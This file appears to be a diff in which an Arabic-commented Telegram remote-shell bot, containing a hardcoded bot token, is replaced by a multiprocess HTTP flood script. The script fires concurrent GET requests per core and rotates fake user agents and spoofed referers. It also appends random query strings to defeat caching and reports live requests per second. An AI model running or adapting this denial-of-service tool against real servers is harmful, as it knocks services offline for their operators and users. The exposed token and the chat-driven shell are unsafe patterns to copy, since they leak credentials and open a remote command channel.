@@ -1,105 +1,83 @@
 import asyncio
-import shlex
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+import aiohttp
+import random
+import string
+import multiprocessing
+from fake_useragent import UserAgent
+import psutil
+import time
 
-TOKEN = '7065846492:AAEjPDpUeadm3EENOQO8_SMtPnInVwpXacw'  # استبدل بتوكنك
-AUTHORIZED_USERS = {7772935915}  # معرفك
+# ----------------------------
+ua = UserAgent()
 
-class ShellSession:
-    def __init__(self):
-        self.cwd = None
-        self.process = None
+def random_headers():
+    return {
+        "User-Agent": ua.random,
+        "Accept": random.choice([
+            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "*/*"
+        ]),
+        "Accept-Language": random.choice(["en-US,en;q=0.5", "en;q=0.7", "ar,en;q=0.6"]),
+        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
+        "Referer": random.choice([
+            "https://google.com/",
+            "https://bing.com/",
+            "https://yahoo.com/"
+        ]),
+    }
 
-    async def start_shell(self):
-        # شيل نظيف بدون تحميل ملفات تعريف، مع prompt بسيط
-        self.process = await asyncio.create_subprocess_shell(
-            '/bin/bash --noprofile --norc',
-            stdin=asyncio.subprocess.PIPE,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.STDOUT,
-        )
-        # نحدد prompt بسيط لمنع أي تعقيدات
-        await self.send_command('PS1="$ "\n')
-        self.cwd = await self.get_cwd()
+def random_query():
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
 
-    async def send_command(self, cmd):
-        self.process.stdin.write(cmd.encode())
-        await self.process.stdin.drain()
+# ----------------------------
+async def async_worker(url, per_second, counter):
+    timeout = aiohttp.ClientTimeout(total=3)
+    async with aiohttp.ClientSession(timeout=timeout, trust_env=True) as session:
+        while True:
+            tasks = []
+            for _ in range(per_second):
+                full_url = f"{url}?{random_query()}"
+                headers = random_headers()
+                task = session.get(full_url, headers=headers)
+                tasks.append(task)
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            counter.value += sum(1 for r in results if not isinstance(r, Exception))
 
-    async def get_cwd(self):
-        await self.send_command('pwd\n')
-        await asyncio.sleep(0.1)
-        output = await self.read_output(timeout=0.2)
-        if output:
-            lines = output.strip().split('\n')
-            return lines[-1]
-        return None
+# ----------------------------
+def process_worker(url, per_second, counter):
+    asyncio.run(async_worker(url, per_second, counter))
 
-    async def read_output(self, timeout=0.5):
-        output = b''
-        try:
-            while True:
-                line = await asyncio.wait_for(self.process.stdout.readline(), timeout=timeout)
-                if not line:
-                    break
-                output += line
-        except asyncio.TimeoutError:
-            pass
-        return output.decode(errors='ignore')
+# ----------------------------
+def monitor(counter, update_interval=1):
+    last_count = 0
+    while True:
+        time.sleep(update_interval)
+        current_count = counter.value
+        rps = current_count - last_count
+        last_count = current_count
+        cpu = psutil.cpu_percent()
+        print(f"[LIVE] RPS: {rps} | CPU: {cpu}% | Total Requests: {current_count}", end='\r')
 
-    async def run_command(self, command):
-        if command.startswith('cd'):
-            parts = shlex.split(command)
-            if len(parts) == 1:
-                command = 'cd ~'
-            # نفذ cd بدون انتظار المخرجات الكثيرة
-            await self.send_command(command + '\n')
-            await asyncio.sleep(0.1)
-            self.cwd = await self.get_cwd()
-            return f'تم تغيير المسار إلى:\n`{self.cwd}`'
+# ----------------------------
+if __name__ == "__main__":
+    url = input("Enter your server URL (http/https): ")
+    per_second = int(input("Requests per second per core: "))
+    cores = multiprocessing.cpu_count()
+    print(f"[INFO] CPU Cores Detected: {cores}")
 
-        await self.send_command(command + '\n')
-        await asyncio.sleep(0.3)
-        output = await self.read_output(timeout=1)
+    # عداد مشترك بين العمليات
+    counter = multiprocessing.Value('i', 0)
 
-        if not output.strip():
-            output = "(لا يوجد مخرجات)"
+    # تشغيل عملية مراقبة
+    monitor_proc = multiprocessing.Process(target=monitor, args=(counter,))
+    monitor_proc.start()
 
-        return output
+    # تشغيل عملية لكل نواة
+    processes = []
+    for _ in range(cores):
+        p = multiprocessing.Process(target=process_worker, args=(url, per_second, counter))
+        p.start()
+        processes.append(p)
 
-shell_session = ShellSession()
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in AUTHORIZED_USERS:
-        await update.message.reply_text("ما عندك صلاحية لاستخدام هذا البوت.")
-        return
-    await shell_session.start_shell()
-    await update.message.reply_text("بوت جاهز، أرسل أي أمر.")
-
-async def run_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in AUTHORIZED_USERS:
-        await update.message.reply_text("ما عندك صلاحية لاستخدام هذا البوت.")
-        return
-
-    command = update.message.text.strip()
-    if not command:
-        await update.message.reply_text("يرجى ارسال أمر صالح.")
-        return
-
-    result = await shell_session.run_command(command)
-
-    # رد مرتب: المسار بأعلى، ثم الناتج
-    response = f"`{shell_session.cwd} $ {command}`\n\n"
-    response += f"```\n{result.strip()}\n```"
-
-    await update.message.reply_text(response, parse_mode='Markdown')
-
-def main():
-    app = ApplicationBuilder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), run_command))
-    app.run_polling()
-
-if __name__ == '__main__':
-    main()
+    for p in processes:
+        p.join()
